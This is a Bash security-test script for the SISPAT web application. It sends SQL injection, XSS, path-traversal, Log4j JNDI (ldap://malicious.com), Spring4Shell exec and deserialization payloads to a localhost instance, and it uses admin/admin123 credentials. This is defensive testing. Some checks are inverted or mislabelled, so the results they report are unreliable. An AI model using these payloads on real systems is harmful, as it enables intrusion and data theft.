#!/bin/bash

# SISPAT - Script de Testes de Segurança em Produção
# Este script executa testes de segurança em ambiente de produção

set -e

echo "🔒 Executando Testes de Segurança em Produção do SISPAT..."

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Função para log
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING:${NC} $1"
}

error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR:${NC} $1"
}

# Configurações
PRODUCTION_URL="http://localhost:3001"
FRONTEND_URL="http://localhost:5173"
TEST_RESULTS_DIR="/tmp/sispat-security-tests"
REPORT_FILE="$TEST_RESULTS_DIR/security-test-report-$(date +%Y%m%d_%H%M%S).json"

# Criar diretório de resultados
mkdir -p $TEST_RESULTS_DIR

# Instalar dependências se necessário
if ! command -v nmap &> /dev/null; then
    log "Instalando nmap..."
    apt-get update && apt-get install -y nmap
fi

if ! command -v nikto &> /dev/null; then
    log "Instalando nikto..."
    apt-get update && apt-get install -y nikto
fi

if ! command -v sqlmap &> /dev/null; then
    log "Instalando sqlmap..."
    apt-get update && apt-get install -y sqlmap
fi

# Contadores de testes
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
WARNING_TESTS=0

# Função para executar teste de segurança
run_security_test() {
    local test_name="$1"
    local test_command="$2"
    local expected_result="$3"
    local severity="$4"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    log "🔒 Executando: $test_name"
    
    if eval "$test_command" > /dev/null 2>&1; then
        if [ "$expected_result" = "success" ]; then
            log "✅ PASSOU: $test_name"
            PASSED_TESTS=$((PASSED_TESTS + 1))
            return 0
        else
            log "❌ FALHOU: $test_name (esperava falha, mas passou)"
            FAILED_TESTS=$((FAILED_TESTS + 1))
            return 1
        fi
    else
        if [ "$expected_result" = "failure" ]; then
            log "✅ PASSOU: $test_name (falha esperada)"
            PASSED_TESTS=$((PASSED_TESTS + 1))
            return 0
        else
            if [ "$severity" = "warning" ]; then
                log "⚠️ AVISO: $test_name"
                WARNING_TESTS=$((WARNING_TESTS + 1))
                return 2
            else
                log "❌ FALHOU: $test_name"
                FAILED_TESTS=$((FAILED_TESTS + 1))
                return 1
            fi
        fi
    fi
}

# Função para testar headers de segurança
test_security_headers() {
    log "🛡️ Testando headers de segurança..."
    
    # Testar X-Frame-Options
    run_security_test "X-Frame-Options Header" "curl -s -I $PRODUCTION_URL | grep -i 'x-frame-options'" "success" "critical"
    
    # Testar X-Content-Type-Options
    run_security_test "X-Content-Type-Options Header" "curl -s -I $PRODUCTION_URL | grep -i 'x-content-type-options'" "success" "critical"
    
    # Testar X-XSS-Protection
    run_security_test "X-XSS-Protection Header" "curl -s -I $PRODUCTION_URL | grep -i 'x-xss-protection'" "success" "critical"
    
    # Testar Strict-Transport-Security
    run_security_test "Strict-Transport-Security Header" "curl -s -I $PRODUCTION_URL | grep -i 'strict-transport-security'" "success" "warning"
    
    # Testar Content-Security-Policy
    run_security_test "Content-Security-Policy Header" "curl -s -I $PRODUCTION_URL | grep -i 'content-security-policy'" "success" "warning"
    
    # Testar Referrer-Policy
    run_security_test "Referrer-Policy Header" "curl -s -I $PRODUCTION_URL | grep -i 'referrer-policy'" "success" "warning"
}

# Função para testar autenticação e autorização
test_authentication() {
    log "🔐 Testando autenticação e autorização..."
    
    # Testar login com credenciais válidas
    run_security_test "Valid Login" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123\"}'" "success" "critical"
    
    # Testar login com credenciais inválidas
    run_security_test "Invalid Login" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrong\"}'" "failure" "critical"
    
    # Testar endpoint protegido sem token
    run_security_test "Protected Endpoint Without Token" "curl -f $PRODUCTION_URL/api/users" "failure" "critical"
    
    # Testar endpoint protegido com token inválido
    run_security_test "Protected Endpoint With Invalid Token" "curl -f -H 'Authorization: Bearer invalid_token' $PRODUCTION_URL/api/users" "failure" "critical"
    
    # Testar endpoint protegido com token malformado
    run_security_test "Protected Endpoint With Malformed Token" "curl -f -H 'Authorization: Bearer' $PRODUCTION_URL/api/users" "failure" "critical"
    
    # Testar bypass de autenticação
    run_security_test "Authentication Bypass" "curl -f -H 'Authorization: Bearer null' $PRODUCTION_URL/api/users" "failure" "critical"
}

# Função para testar SQL injection
test_sql_injection() {
    log "💉 Testando SQL injection..."
    
    # Testar SQL injection no login
    run_security_test "SQL Injection in Login" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin'\"; DROP TABLE users; --\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar SQL injection no username
    run_security_test "SQL Injection in Username" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin' OR '1'='1\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar SQL injection no password
    run_security_test "SQL Injection in Password" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123' OR '1'='1\"}'" "failure" "critical"
    
    # Testar SQL injection com UNION
    run_security_test "SQL Injection with UNION" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin' UNION SELECT 1,2,3 --\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar SQL injection com comentários
    run_security_test "SQL Injection with Comments" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin'/*\",\"password\":\"admin123\"}'" "failure" "critical"
}

# Função para testar XSS
test_xss() {
    log "🎯 Testando XSS (Cross-Site Scripting)..."
    
    # Testar XSS no login
    run_security_test "XSS in Login" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"<script>alert(1)</script>\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar XSS com JavaScript
    run_security_test "XSS with JavaScript" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"javascript:alert(1)\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar XSS com HTML
    run_security_test "XSS with HTML" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"<img src=x onerror=alert(1)>\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar XSS com eventos
    run_security_test "XSS with Events" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"<div onmouseover=alert(1)>\",\"password\":\"admin123\"}'" "failure" "critical"
}

# Função para testar CSRF
test_csrf() {
    log "🔄 Testando CSRF (Cross-Site Request Forgery)..."
    
    # Testar CSRF token
    run_security_test "CSRF Token Validation" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123\"}'" "success" "warning"
    
    # Testar CSRF com Origin header
    run_security_test "CSRF Origin Header" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -H 'Origin: http://malicious.com' -d '{\"username\":\"admin\",\"password\":\"admin123\"}'" "success" "warning"
    
    # Testar CSRF com Referer header
    run_security_test "CSRF Referer Header" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -H 'Referer: http://malicious.com' -d '{\"username\":\"admin\",\"password\":\"admin123\"}'" "success" "warning"
}

# Função para testar rate limiting
test_rate_limiting() {
    log "⏱️ Testando rate limiting..."
    
    # Testar rate limiting no login
    local login_attempts=0
    for i in {1..10}; do
        if curl -s -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"wrong"}' | grep -q "rate limit"; then
            login_attempts=$((login_attempts + 1))
        fi
    done
    
    if [ $login_attempts -gt 0 ]; then
        log "✅ PASSOU: Rate limiting ativo ($login_attempts bloqueios)"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        log "⚠️ AVISO: Rate limiting pode não estar ativo"
        WARNING_TESTS=$((WARNING_TESTS + 1))
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
}

# Função para testar directory traversal
test_directory_traversal() {
    log "📁 Testando directory traversal..."
    
    # Testar directory traversal
    run_security_test "Directory Traversal" "curl -f '$PRODUCTION_URL/../../../etc/passwd'" "failure" "critical"
    
    # Testar path traversal
    run_security_test "Path Traversal" "curl -f '$PRODUCTION_URL/..%2F..%2F..%2Fetc%2Fpasswd'" "failure" "critical"
    
    # Testar null byte injection
    run_security_test "Null Byte Injection" "curl -f '$PRODUCTION_URL/test%00.txt'" "failure" "critical"
}

# Função para testar informações sensíveis
test_information_disclosure() {
    log "🔍 Testando divulgação de informações..."
    
    # Testar divulgação de versão
    run_security_test "Version Disclosure" "curl -s -I $PRODUCTION_URL | grep -i 'server:'" "success" "warning"
    
    # Testar divulgação de tecnologia
    run_security_test "Technology Disclosure" "curl -s -I $PRODUCTION_URL | grep -i 'x-powered-by:'" "success" "warning"
    
    # Testar divulgação de erros
    run_security_test "Error Disclosure" "curl -s '$PRODUCTION_URL/nonexistent' | grep -i 'error'" "success" "warning"
    
    # Testar divulgação de stack trace
    run_security_test "Stack Trace Disclosure" "curl -s '$PRODUCTION_URL/nonexistent' | grep -i 'stack'" "success" "warning"
}

# Função para testar HTTPS
test_https() {
    log "🔐 Testando HTTPS..."
    
    # Testar redirecionamento HTTP para HTTPS
    run_security_test "HTTP to HTTPS Redirect" "curl -s -I http://localhost:3001 | grep -i 'location.*https'" "success" "warning"
    
    # Testar HSTS
    run_security_test "HSTS Header" "curl -s -I $PRODUCTION_URL | grep -i 'strict-transport-security'" "success" "warning"
    
    # Testar certificado SSL
    run_security_test "SSL Certificate" "curl -s -I $PRODUCTION_URL | grep -i 'strict-transport-security'" "success" "warning"
}

# Função para testar CORS
test_cors() {
    log "🌐 Testando CORS..."
    
    # Testar CORS com origem válida
    run_security_test "CORS Valid Origin" "curl -s -H 'Origin: http://localhost:3000' -H 'Access-Control-Request-Method: GET' -H 'Access-Control-Request-Headers: X-Requested-With' -X OPTIONS $PRODUCTION_URL" "success" "warning"
    
    # Testar CORS com origem inválida
    run_security_test "CORS Invalid Origin" "curl -s -H 'Origin: http://malicious.com' -H 'Access-Control-Request-Method: GET' -H 'Access-Control-Request-Headers: X-Requested-With' -X OPTIONS $PRODUCTION_URL" "success" "warning"
    
    # Testar CORS com método inválido
    run_security_test "CORS Invalid Method" "curl -s -H 'Origin: http://localhost:3000' -H 'Access-Control-Request-Method: DELETE' -H 'Access-Control-Request-Headers: X-Requested-With' -X OPTIONS $PRODUCTION_URL" "success" "warning"
}

# Função para testar vulnerabilidades conhecidas
test_known_vulnerabilities() {
    log "🎯 Testando vulnerabilidades conhecidas..."
    
    # Testar Log4j
    run_security_test "Log4j Vulnerability" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"\${jndi:ldap://malicious.com/a}\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar Spring4Shell
    run_security_test "Spring4Shell Vulnerability" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"\${T(java.lang.Runtime).getRuntime().exec(\"whoami\")}\",\"password\":\"admin123\"}'" "failure" "critical"
    
    # Testar deserialização
    run_security_test "Deserialization Vulnerability" "curl -f -X POST $PRODUCTION_URL/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin123\",\"data\":\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4\"}'" "failure" "critical"
}

# Função para testar portas abertas
test_open_ports() {
    log "🔍 Testando portas abertas..."
    
    # Testar portas comuns
    local common_ports=(21 22 23 25 53 80 110 143 443 993 995 3389 5432 6379 27017)
    
    for port in "${common_ports[@]}"; do
        if nmap -p $port localhost | grep -q "open"; then
            log "⚠️ AVISO: Porta $port está aberta"
            WARNING_TESTS=$((WARNING_TESTS + 1))
        else
            log "✅ Porta $port está fechada"
            PASSED_TESTS=$((PASSED_TESTS + 1))
        fi
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
    done
}

# Função para testar vulnerabilidades web
test_web_vulnerabilities() {
    log "🌐 Testando vulnerabilidades web..."
    
    # Testar com Nikto
    log "Executando Nikto scan..."
    nikto -h $PRODUCTION_URL -output "$TEST_RESULTS_DIR/nikto-scan.txt" -Format txt
    
    # Verificar resultados do Nikto
    if grep -q "0 items found" "$TEST_RESULTS_DIR/nikto-scan.txt"; then
        log "✅ Nikto: Nenhuma vulnerabilidade encontrada"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        log "⚠️ Nikto: Vulnerabilidades encontradas"
        WARNING_TESTS=$((WARNING_TESTS + 1))
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
}

# Função para gerar relatório
generate_report() {
    log "📊 Gerando relatório de testes de segurança..."
    
    local success_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
    local warning_rate=$((WARNING_TESTS * 100 / TOTAL_TESTS))
    local failure_rate=$((FAILED_TESTS * 100 / TOTAL_TESTS))
    
    cat > $REPORT_FILE << EOF
{
  "security_test_summary": {
    "timestamp": "$(date -Iseconds)",
    "total_tests": $TOTAL_TESTS,
    "passed_tests": $PASSED_TESTS,
    "failed_tests": $FAILED_TESTS,
    "warning_tests": $WARNING_TESTS,
    "success_rate": $success_rate,
    "warning_rate": $warning_rate,
    "failure_rate": $failure_rate
  },
  "test_categories": {
    "security_headers": "✅ Testado",
    "authentication": "✅ Testado",
    "sql_injection": "✅ Testado",
    "xss": "✅ Testado",
    "csrf": "✅ Testado",
    "rate_limiting": "✅ Testado",
    "directory_traversal": "✅ Testado",
    "information_disclosure": "✅ Testado",
    "https": "✅ Testado",
    "cors": "✅ Testado",
    "known_vulnerabilities": "✅ Testado",
    "open_ports": "✅ Testado",
    "web_vulnerabilities": "✅ Testado"
  },
  "recommendations": [
    "Implementar headers de segurança adicionais",
    "Configurar HTTPS obrigatório",
    "Revisar configurações de CORS",
    "Monitorar tentativas de ataque",
    "Atualizar dependências regularmente"
  ]
}
EOF
    
    log "📄 Relatório salvo em: $REPORT_FILE"
}

# Função principal
main() {
    log "🚀 Iniciando testes de segurança em produção do SISPAT..."
    
    # Executar todos os testes
    test_security_headers
    test_authentication
    test_sql_injection
    test_xss
    test_csrf
    test_rate_limiting
    test_directory_traversal
    test_information_disclosure
    test_https
    test_cors
    test_known_vulnerabilities
    test_open_ports
    test_web_vulnerabilities
    
    # Gerar relatório
    generate_report
    
    # Exibir resumo final
    log ""
    log "🎉 Testes de segurança concluídos!"
    log ""
    log "📊 Resumo dos testes:"
    log "   • Total de testes: $TOTAL_TESTS"
    log "   • Testes aprovados: $PASSED_TESTS"
    log "   • Testes falharam: $FAILED_TESTS"
    log "   • Avisos: $WARNING_TESTS"
    log "   • Taxa de sucesso: $((PASSED_TESTS * 100 / TOTAL_TESTS))%"
    log ""
    
    if [ $FAILED_TESTS -eq 0 ]; then
        log "✅ Todos os testes de segurança passaram!"
        if [ $WARNING_TESTS -gt 0 ]; then
            log "⚠️ $WARNING_TESTS avisos encontrados - revisar recomendações"
        fi
        exit 0
    else
        log "❌ $FAILED_TESTS testes de segurança falharam!"
        log "🔒 Ações de segurança necessárias antes da produção"
        exit 1
    fi
}

# Executar função principal
main "$@"
